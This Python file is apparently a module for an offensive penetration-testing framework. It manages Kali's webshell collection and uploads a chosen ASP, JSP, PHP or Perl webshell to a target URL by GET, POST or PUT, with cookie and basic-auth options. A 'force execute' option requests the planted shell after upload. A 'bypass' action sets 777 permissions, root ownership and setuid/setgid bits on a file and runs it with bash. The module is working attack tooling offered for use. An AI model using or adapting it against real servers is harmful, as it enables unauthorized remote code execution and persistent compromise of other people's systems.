#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Webshells Module - Collection of webshells
Access, list, search, copy, and upload webshells via HTTP/HTTPS (GET, POST, PUT)
With permission bypass and forced execution
"""

import os
import sys
import subprocess
import shutil
import re
import time
import json
import glob
import requests
import urllib.parse
import base64
import tempfile
import stat
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    from rich.align import Align
    from rich.text import Text
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = None

console = Console()

WEBSHELLS_DIR = "/usr/share/webshells"

MODULE_INFO = {
    "name": "Webshells Collection",
    "description": "Collection of webshells with HTTP/HTTPS upload (GET, POST, PUT) and permission bypass",
    "author": "RevilCipher",
    "license": "GPLv2+",
    "platform": "linux,windows,macos",
    "arch": "all",
    "rank": "Great",
    "dependencies": ["requests"],
    "references": [
        "https://www.kali.org/tools/webshells/",
        "https://github.com/tennc/webshell"
    ]
}

OPTIONS = {
    "ACTION": {
        "description": "list|search|copy|upload|info|bypass",
        "required": True,
        "default": "list",
        "choices": ["list", "search", "copy", "upload", "info", "bypass"]
    },
    "TYPE": {
        "description": "asp|aspx|cfm|jsp|perl|php|all",
        "required": False,
        "default": "all",
        "choices": ["all", "asp", "aspx", "cfm", "jsp", "perl", "php"]
    },
    "SEARCH": {
        "description": "Search pattern",
        "required": False,
        "default": ""
    },
    "SOURCE": {
        "description": "Source file path or filename",
        "required": False,
        "default": ""
    },
    "DEST": {
        "description": "Destination path (copy) or URL (upload)",
        "required": False,
        "default": ""
    },
    "UPLOAD_URL": {
        "description": "Upload URL (http://target.com/upload.php)",
        "required": False,
        "default": ""
    },
    "UPLOAD_PARAM": {
        "description": "Upload parameter name",
        "required": False,
        "default": "file"
    },
    "UPLOAD_METHOD": {
        "description": "GET|POST|PUT",
        "required": False,
        "default": "POST",
        "choices": ["GET", "POST", "PUT"]
    },
    "UPLOAD_ENCODING": {
        "description": "raw|base64|url",
        "required": False,
        "default": "raw",
        "choices": ["raw", "base64", "url"]
    },
    "UPLOAD_HEADERS": {
        "description": "JSON: {'Auth':'Bearer token'}",
        "required": False,
        "default": "{}"
    },
    "UPLOAD_COOKIE": {
        "description": "Cookie string",
        "required": False,
        "default": ""
    },
    "UPLOAD_USER": {
        "description": "Username for Basic Auth",
        "required": False,
        "default": ""
    },
    "UPLOAD_PASS": {
        "description": "Password for Basic Auth",
        "required": False,
        "default": ""
    },
    "UPLOAD_FILENAME": {
        "description": "Custom filename for upload",
        "required": False,
        "default": ""
    },
    "BYPASS_METHOD": {
        "description": "chmod|chown|sudo|setuid|setgid|all",
        "required": False,
        "default": "all",
        "choices": ["chmod", "chown", "sudo", "setuid", "setgid", "all"]
    },
    "BYPASS_PERMISSION": {
        "description": "Permission to set (777, 755, 644)",
        "required": False,
        "default": "777"
    },
    "BYPASS_OWNER": {
        "description": "Owner to set (root:root)",
        "required": False,
        "default": "root:root"
    },
    "FORCE_EXEC": {
        "description": "Execute after upload",
        "required": False,
        "default": "false"
    },
    "SHOW_CONTENT": {
        "description": "Show file content",
        "required": False,
        "default": "false"
    },
    "SAVE_OUTPUT": {
        "description": "Save output to file",
        "required": False,
        "default": ""
    },
    "LIST_FILES": {
        "description": "List available files",
        "required": False,
        "default": "false"
    },
    "VERBOSE": {
        "description": "Verbose output",
        "required": False,
        "default": "false"
    }
}


def check_webshells_dir():
    if not os.path.exists(WEBSHELLS_DIR):
        console.print(f"[red]❌ Webshells not found: {WEBSHELLS_DIR}[/red]")
        console.print("[yellow]Install: sudo apt install webshells[/yellow]")
        return False
    console.print(f"[green]✓[/green] Webshells: [dim]{WEBSHELLS_DIR}[/dim]")
    return True


def find_webshell_file(filename, webshell_type="all"):
    types = ["asp", "aspx", "cfm", "jsp", "perl", "php"] if webshell_type == "all" else [webshell_type]
    found_files = []
    
    for t in types:
        type_dir = os.path.join(WEBSHELLS_DIR, t)
        if not os.path.exists(type_dir):
            continue
        for root, dirs, files in os.walk(type_dir):
            for file in files:
                if file == filename or file.lower() == filename.lower():
                    full_path = os.path.join(root, file)
                    found_files.append({
                        "name": file,
                        "path": os.path.relpath(full_path, WEBSHELLS_DIR),
                        "full_path": full_path,
                        "type": t,
                        "size": os.path.getsize(full_path),
                        "size_str": format_size(os.path.getsize(full_path))
                    })
    return found_files


def display_banner():
    banner = """
    ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
    ║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔═╗║
    ║╚═╝║║║║║║║║║║║╚═╝║║║║║║║╚═╝║║╚═╝║
    ║╔╗╔╝║║║║║║║║║║╔╗╔╝║║║║║║╔╗╔╝║╔╗╔╝
    ║║║╚╗║╚═╝║║╚═╝║║║║╚╗║╚═╝║║║║╚╗║║║╚╗
    ╚╝╚═╝╚═══╝╚═══╝╚╝╚═╝╚═══╝╚╝╚═╝╚╝╚═╝
    """
    panel = Panel(
        f"[bold green]{banner}[/bold green]\n[bold white]Webshells Collection[/bold white]\n[dim]📦 ASP | ASPX | CFM | JSP | Perl | PHP[/dim]\n[dim]🌐 Upload (GET|POST|PUT) | 🔓 Bypass[/dim]",
        border_style="green", box=box.DOUBLE_EDGE
    )
    console.print(Align.center(panel))
    console.print()


def list_webshells(webshell_type="all"):
    types = ["asp", "aspx", "cfm", "jsp", "perl", "php"] if webshell_type == "all" else [webshell_type]
    
    table = Table(title="[bold cyan]Webshells[/bold cyan]", box=box.ROUNDED, border_style="cyan")
    table.add_column("Type", style="green", width=10)
    table.add_column("File", style="white", width=35)
    table.add_column("Size", style="dim", width=12)
    table.add_column("Path", style="dim", width=30)
    
    total = 0
    for t in types:
        type_dir = os.path.join(WEBSHELLS_DIR, t)
        if not os.path.exists(type_dir):
            continue
        files = []
        for root, dirs, filenames in os.walk(type_dir):
            for f in filenames:
                if f.endswith(('.php', '.asp', '.aspx', '.jsp', '.cfm', '.pl', '.cgi')):
                    full_path = os.path.join(root, f)
                    files.append({
                        "name": f,
                        "path": os.path.relpath(full_path, WEBSHELLS_DIR),
                        "size": os.path.getsize(full_path)
                    })
        total += len(files)
        for f in sorted(files, key=lambda x: x["name"])[:15]:
            table.add_row(t.upper(), f["name"], format_size(f["size"]), f["path"])
        if len(files) > 15:
            table.add_row("", f"[dim]... and {len(files)-15} more[/dim]", "", "")
    
    console.print(table)
    console.print(f"[dim]Total: {total} files[/dim]")
    return {"total": total}


def search_webshells(pattern, webshell_type="all"):
    if not pattern:
        console.print("[red]Pattern required[/red]")
        return None
    
    types = ["asp", "aspx", "cfm", "jsp", "perl", "php"] if webshell_type == "all" else [webshell_type]
    results = []
    pattern_lower = pattern.lower()
    
    for t in types:
        type_dir = os.path.join(WEBSHELLS_DIR, t)
        if not os.path.exists(type_dir):
            continue
        for root, dirs, files in os.walk(type_dir):
            for f in files:
                if f.endswith(('.php', '.asp', '.aspx', '.jsp', '.cfm', '.pl', '.cgi')):
                    full_path = os.path.join(root, f)
                    if pattern_lower in f.lower():
                        results.append({"file": f, "path": os.path.relpath(full_path, WEBSHELLS_DIR), "type": t, "match": "filename"})
                        continue
                    try:
                        if os.path.getsize(full_path) < 50000:
                            with open(full_path, 'r', errors='ignore') as fp:
                                if pattern_lower in fp.read().lower():
                                    results.append({"file": f, "path": os.path.relpath(full_path, WEBSHELLS_DIR), "type": t, "match": "content"})
                    except:
                        pass
    
    if not results:
        console.print("[yellow]No matches[/yellow]")
        return results
    
    table = Table(title=f"[bold cyan]Search: {pattern}[/bold cyan]", box=box.ROUNDED, border_style="yellow")
    table.add_column("Type", style="green", width=10)
    table.add_column("File", style="white", width=35)
    table.add_column("Match", style="cyan", width=12)
    table.add_column("Path", style="dim", width=30)
    
    for r in results[:30]:
        table.add_row(r["type"].upper(), r["file"], r["match"], r["path"])
    
    console.print(table)
    console.print(f"[dim]Total: {len(results)} matches[/dim]")
    return results


def copy_webshell(source, dest, webshell_type="all"):
    if not source or not dest:
        console.print("[red]SOURCE and DEST required[/red]")
        return False
    
    if os.path.isdir(dest):
        dest = os.path.join(dest, os.path.basename(source))
    
    source_path = None
    if os.path.exists(source):
        source_path = source
    else:
        full_path = os.path.join(WEBSHELLS_DIR, source)
        if os.path.exists(full_path):
            source_path = full_path
        else:
            found = find_webshell_file(source, webshell_type)
            if found:
                if len(found) == 1:
                    source_path = found[0]["full_path"]
                    console.print(f"[green]✓[/green] Found: [dim]{found[0]['path']}[/dim]")
                else:
                    console.print("[yellow]Multiple files:[/yellow]")
                    for f in found:
                        console.print(f"  {f['path']}")
                    return False
            else:
                console.print(f"[red]File not found: {source}[/red]")
                return False
    
    os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
    
    try:
        shutil.copy2(source_path, dest)
        console.print(f"[green]✅ Copied: {source_path} → {dest}[/green]")
        console.print(f"[dim]Size: {format_size(os.path.getsize(dest))}[/dim]")
        return True
    except PermissionError:
        console.print("[yellow]Permission denied. Try bypass action.[/yellow]")
        return False
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return False


def upload_webshell_http(source, upload_url, webshell_type="all", options=None):
    if options is None:
        options = {}
    
    if not source:
        console.print("[red]SOURCE required[/red]")
        return False
    
    if not upload_url:
        console.print("[red]Upload URL required[/red]")
        return False
    
    # Find source
    source_path = None
    if os.path.exists(source):
        source_path = source
    else:
        full_path = os.path.join(WEBSHELLS_DIR, source)
        if os.path.exists(full_path):
            source_path = full_path
        else:
            found = find_webshell_file(source, webshell_type)
            if found:
                if len(found) == 1:
                    source_path = found[0]["full_path"]
                    console.print(f"[green]✓[/green] Found: [dim]{found[0]['path']}[/dim]")
                else:
                    console.print("[yellow]Multiple files:[/yellow]")
                    for f in found:
                        console.print(f"  {f['path']}")
                    return False
            else:
                console.print(f"[red]File not found: {source}[/red]")
                return False
    
    # Get options with defaults
    upload_param = options.get("UPLOAD_PARAM", "file")
    upload_method = options.get("UPLOAD_METHOD", "POST").upper()
    upload_encoding = options.get("UPLOAD_ENCODING", "raw").lower()
    custom_headers = options.get("UPLOAD_HEADERS", "{}")
    cookie = options.get("UPLOAD_COOKIE", "")
    username = options.get("UPLOAD_USER", "")
    password = options.get("UPLOAD_PASS", "")
    custom_filename = options.get("UPLOAD_FILENAME", "")
    force_exec = options.get("FORCE_EXEC", "false").lower() == "true"
    verbose = options.get("VERBOSE", "false").lower() == "true"
    
    try:
        headers = json.loads(custom_headers) if custom_headers else {}
    except:
        headers = {}
    
    if cookie:
        headers["Cookie"] = cookie
    
    filename = custom_filename or os.path.basename(source_path)
    with open(source_path, 'rb') as f:
        file_content = f.read()
    
    # Encode for GET
    encoded_content = file_content
    encoding_desc = "raw"
    if upload_method == "GET":
        if upload_encoding == "base64":
            encoded_content = base64.b64encode(file_content).decode('ascii')
            encoding_desc = "base64"
        elif upload_encoding == "url":
            encoded_content = urllib.parse.quote_from_bytes(file_content)
            encoding_desc = "URL encoded"
        else:
            try:
                encoded_content = file_content.decode('utf-8', errors='ignore')
                encoding_desc = "raw text"
            except:
                encoded_content = file_content
                encoding_desc = "raw bytes"
    
    # Show info
    console.print(f"[cyan]Uploading: {filename} ({format_size(len(file_content))})[/cyan]")
    console.print(f"[dim]URL: {upload_url}[/dim]")
    console.print(f"[dim]Method: {upload_method} | Param: {upload_param}[/dim]")
    if force_exec:
        console.print("[yellow]⚡ Force Execute: ON[/yellow]")
    
    auth = (username, password) if username and password else None
    
    try:
        if upload_method == "GET":
            parsed = urllib.parse.urlparse(upload_url)
            query = urllib.parse.parse_qs(parsed.query)
            query[upload_param] = [str(encoded_content)]
            new_query = urllib.parse.urlencode(query, doseq=True)
            final_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            if verbose:
                console.print(f"[dim]GET URL: {final_url[:100]}...[/dim]")
            response = requests.get(final_url, headers=headers, auth=auth, timeout=60)
            
        elif upload_method == "PUT":
            response = requests.put(upload_url, data=file_content, headers=headers, auth=auth, timeout=60)
            
        else:  # POST
            files = {upload_param: (filename, file_content)}
            response = requests.post(upload_url, files=files, headers=headers, auth=auth, timeout=60)
        
        console.print(f"[bold]Status:[/bold] {response.status_code}")
        
        if response.status_code in [200, 201, 202, 204, 302, 303]:
            console.print(f"[green]✅ Upload successful![/green]")
            
            if force_exec:
                console.print("[cyan]⚡ Executing...[/cyan]")
                try:
                    exec_url = response.headers.get('Location', upload_url)
                    exec_resp = requests.get(exec_url, timeout=30)
                    if exec_resp.status_code == 200:
                        console.print("[green]✓ Executed[/green]")
                        console.print(f"[dim]{exec_resp.text[:300]}[/dim]")
                except Exception as e:
                    console.print(f"[yellow]Could not execute: {e}[/yellow]")
            
            # Show response
            try:
                if 'json' in response.headers.get('content-type', ''):
                    console.print(f"[dim]{json.dumps(response.json(), indent=2)}[/dim]")
                else:
                    console.print(f"[dim]{response.text[:300]}[/dim]")
            except:
                pass
            return True
        else:
            console.print(f"[red]Upload failed: {response.status_code}[/red]")
            if verbose:
                console.print(f"[dim]{response.text[:500]}[/dim]")
            return False
            
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return False


def bypass_permissions(target_path, method="all", permission="777", owner="root:root"):
    if not os.path.exists(target_path):
        console.print(f"[red]Target not found: {target_path}[/red]")
        return {"success": False}
    
    console.print(f"[bold cyan]🔓 Bypassing: {target_path}[/bold cyan]")
    
    methods = ["chmod", "chown", "sudo", "setuid", "setgid"] if method == "all" else [method]
    results = {"success": False, "methods": []}
    
    for m in methods:
        console.print(f"[dim]→ Trying {m}...[/dim]")
        try:
            if m == "chmod":
                try:
                    os.chmod(target_path, int(permission, 8))
                    console.print(f"[green]✓ chmod {permission}[/green]")
                    results["success"] = True
                    results["methods"].append(f"chmod({permission})")
                except PermissionError:
                    subprocess.run(["sudo", "chmod", permission, target_path], check=True, timeout=10)
                    console.print(f"[green]✓ sudo chmod {permission}[/green]")
                    results["success"] = True
                    results["methods"].append(f"sudo chmod({permission})")
            
            elif m == "chown":
                try:
                    if ":" in owner:
                        user, group = owner.split(":", 1)
                        import pwd, grp
                        uid = pwd.getpwnam(user).pw_uid
                        gid = grp.getgrnam(group).gr_gid
                        os.chown(target_path, uid, gid)
                    else:
                        subprocess.run(["sudo", "chown", owner, target_path], check=True, timeout=10)
                    console.print(f"[green]✓ chown {owner}[/green]")
                    results["success"] = True
                    results["methods"].append(f"chown({owner})")
                except Exception as e:
                    console.print(f"[red]✗ chown failed: {e}[/red]")
            
            elif m == "sudo":
                subprocess.run(["sudo", "chmod", permission, target_path], check=True, timeout=10)
                console.print(f"[green]✓ sudo[/green]")
                results["success"] = True
                results["methods"].append("sudo")
            
            elif m == "setuid":
                os.chmod(target_path, os.stat(target_path).st_mode | stat.S_ISUID)
                console.print("[green]✓ SETUID[/green]")
                results["success"] = True
                results["methods"].append("setuid")
            
            elif m == "setgid":
                os.chmod(target_path, os.stat(target_path).st_mode | stat.S_ISGID)
                console.print("[green]✓ SETGID[/green]")
                results["success"] = True
                results["methods"].append("setgid")
                
        except Exception as e:
            console.print(f"[red]✗ {m} failed: {e}[/red]")
    
    if results["success"]:
        console.print(f"[bold green]✅ Bypass successful! Methods: {', '.join(results['methods'])}[/bold green]")
    else:
        console.print("[bold red]❌ All bypass attempts failed[/bold red]")
    
    return results


def format_size(size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024.0:
            return f"{size:.1f} {unit}"
        size /= 1024.0
    return f"{size:.1f} TB"


def run(session, options):
    display_banner()
    
    if not check_webshells_dir():
        return {"error": "Webshells not found"}
    
    action = options.get("ACTION", "list").lower()
    webshell_type = options.get("TYPE", "all").lower()
    search_pattern = options.get("SEARCH", "").strip()
    source = options.get("SOURCE", "").strip()
    dest = options.get("DEST", "").strip()
    upload_url = options.get("UPLOAD_URL", "").strip()
    show_content = options.get("SHOW_CONTENT", "false").lower() == "true"
    list_files = options.get("LIST_FILES", "false").lower() == "true"
    
    console.print(f"[bold]Action: {action.upper()} | Type: {webshell_type.upper()}[/bold]")
    console.print()
    
    if list_files and action in ["copy", "upload"]:
        console.print("[yellow]Available files:[/yellow]")
        list_webshells(webshell_type)
        console.print()
    
    results = None
    
    if action == "list":
        results = list_webshells(webshell_type)
    
    elif action == "search":
        if not search_pattern:
            console.print("[red]SEARCH pattern required[/red]")
            return {"error": "Pattern required"}
        results = search_webshells(search_pattern, webshell_type)
    
    elif action == "copy":
        if not source:
            console.print("[red]SOURCE required[/red]")
            return {"error": "Source required"}
        if not dest:
            console.print("[red]DEST required[/red]")
            return {"error": "Destination required"}
        copy_webshell(source, dest, webshell_type)
    
    elif action == "upload":
        if not source:
            console.print("[red]SOURCE required[/red]")
            return {"error": "Source required"}
        if not upload_url and not dest:
            console.print("[red]UPLOAD_URL or DEST required[/red]")
            return {"error": "URL required"}
        
        upload_target = upload_url or dest
        # Pass ALL options to upload function
        upload_webshell_http(source, upload_target, webshell_type, options)
    
    elif action == "bypass":
        target = source or dest
        if not target:
            console.print("[red]SOURCE or DEST required[/red]")
            return {"error": "Target required"}
        bypass_method = options.get("BYPASS_METHOD", "all")
        permission = options.get("BYPASS_PERMISSION", "777")
        owner = options.get("BYPASS_OWNER", "root:root")
        results = bypass_permissions(target, bypass_method, permission, owner)
        
        if results["success"] and options.get("FORCE_EXEC", "false").lower() == "true":
            console.print()
            console.print("[cyan]⚡ Executing...[/cyan]")
            try:
                subprocess.run(["bash", target], check=False, timeout=10)
                console.print("[green]✓ Executed[/green]")
            except:
                console.print("[yellow]Could not execute[/yellow]")
    
    elif action == "info":
        if not source:
            console.print("[red]SOURCE required[/red]")
            return {"error": "File required"}
        # Simplified info display
        found = find_webshell_file(source, webshell_type)
        if found:
            for f in found:
                console.print(f"[green]{f['name']}[/green]")
                console.print(f"  Path: {f['path']}")
                console.print(f"  Size: {f['size_str']}")
                console.print(f"  Type: {f['type']}")
                if show_content:
                    try:
                        with open(f['full_path'], 'r', errors='ignore') as fp:
                            console.print(f"[dim]{fp.read(500)}[/dim]")
                    except:
                        pass
        else:
            console.print("[red]File not found[/red]")
    
    else:
        console.print(f"[red]Unknown action: {action}[/red]")
    
    if results:
        session["webshells_results"] = results
    return results